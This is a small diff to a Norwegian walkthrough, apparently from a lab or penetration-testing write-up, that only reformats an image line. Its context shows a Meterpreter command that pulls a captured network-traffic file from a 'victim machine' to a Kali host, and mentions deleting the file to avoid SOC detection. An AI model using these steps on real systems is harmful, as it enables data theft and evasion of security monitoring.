@@ -63,7 +63,10 @@ For å gå tilbake til meterpreter-prompten skriver vi «exit» slik som dette:
 Vi laster ned nettverkstrafikk-filen fra filbanen den ligger i og over til kali maskinen vår med følgende kommando: «download c:\\windows\\temp\\ntwrkcap.etl /home/kali».
 
 
-Imotsetning til vanlig input på windows, må vi legge til en ekstra «\» på meterpreter: <img width="940" height="116" alt="image" src="https://github.com/user-attachments/assets/b6ab9445-2850-42d3-a4b8-89646c124518" />
+Imotsetning til vanlig input på windows, må vi legge til en ekstra «\» på meterpreter: 
+
+<img width="940" height="116" alt="image" src="https://github.com/user-attachments/assets/b6ab9445-2850-42d3-a4b8-89646c124518" />
+
 For å sørge for å unngå SOC-deteksjon, sletter vi filen fra offermaskinen før vi gjør oss ferdig med dette steget. Vi gjør dette med følgende kommando:
 
 
